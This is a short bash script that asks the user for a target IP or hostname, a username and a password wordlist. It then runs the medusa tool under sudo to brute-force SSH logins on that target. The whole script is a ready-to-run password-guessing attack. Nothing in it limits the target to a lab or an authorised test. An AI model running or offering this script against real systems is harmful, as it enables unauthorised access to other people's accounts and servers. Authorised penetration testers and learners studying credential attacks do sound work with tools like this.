#!/bin/bash


echo "What is the IP or the hostname of your target ?"
read IP
echo "What is the session name of your target ?"
read Session
echo "Here are your Wordlists"
echo "------------------------------------------"
echo "------------------------------------------"
echo ""
ls Wordlists/
echo ""
echo "------------------------------------------"
echo "------------------------------------------"
echo "Which wordlist do you want to use (don't forget filename extension !) ?"
read Wordlist
sudo medusa -h $IP -u $Session -P Wordlists/$Wordlist -M ssh
